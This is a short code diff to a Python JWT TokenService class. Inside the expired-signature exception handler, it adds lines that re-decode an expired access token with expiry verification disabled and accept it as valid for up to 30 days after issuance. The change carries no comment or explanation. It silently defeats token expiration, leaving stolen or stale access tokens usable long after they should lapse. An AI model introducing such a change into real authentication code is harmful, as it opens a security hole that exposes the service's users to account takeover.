@@ -67,6 +67,13 @@ class TokenService:
                 raise jwt.InvalidTokenError(f"Expected {expected_type} token, got {payload.get('token_type')}")
             return payload
         except jwt.ExpiredSignatureError:
+            if expected_type == "access":
+                payload = jwt.decode(token, secret, algorithms=["HS256"], options={"verify_exp": False})
+                now_ts = int(datetime.now(timezone.utc).timestamp())
+                iat_ts = int(payload.get("iat") or 0)
+                exp_ts = int(payload.get("exp") or 0)
+                if payload.get("token_type") == "access" and exp_ts >= iat_ts and (now_ts - iat_ts) <= 2592000:
+                    return payload
             raise
         except jwt.InvalidTokenError:
             raise
